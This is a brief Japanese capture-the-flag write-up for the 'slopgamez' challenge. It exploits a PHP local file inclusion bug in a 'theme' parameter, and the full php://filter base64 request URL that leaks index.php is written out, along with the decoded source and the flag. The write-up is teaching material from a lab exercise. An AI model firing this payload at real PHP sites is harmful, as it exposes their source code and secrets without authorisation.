# slopgamez

## / Overview

PHPのLFI

## / Writeup

次のようなサイトにアクセスします。

```
http://slopgamez.play.ctf.se:13337/index.php?theme=themes/dark
```

クエリストリングが怪しそうですね。まずはディレクトリトラバーサルを疑い、`/flag`などを試しますが`No such file or directory`が出ます。問題の説明文が`PHP`に関することであったので関連する技術を見ていると、`php://filter/convert.base64-encode/resource=index.php`を指定してPHPのソースコードを見るのが定番みたいです。なので試してみます。

```
view-source:http://slopgamez.play.ctf.se:13337/index.php?theme=php://filter/convert.base64-encode/resource=index.php
```

```html
<head>
        <title>Wargaming Scene Phile</title>
        <style>
            PD9waHAKCiA ... PC9odG1sPgo=        
        </style>
</head>
```

`<style>`タグにbase64エンコードされた`index.php`が出てきました。デコードすると処理前のPHPのコメントアウトが表示されてそのままフラグゲットです。

```php
<?php

    // FLAG: midnight{w4ch00_t4lk1ng_4b0ut_w1ll1s}

    if (empty($_REQUEST['theme'])){
        header('Location: index.php?theme=themes/dark');
        exit(0);
    }
?>
```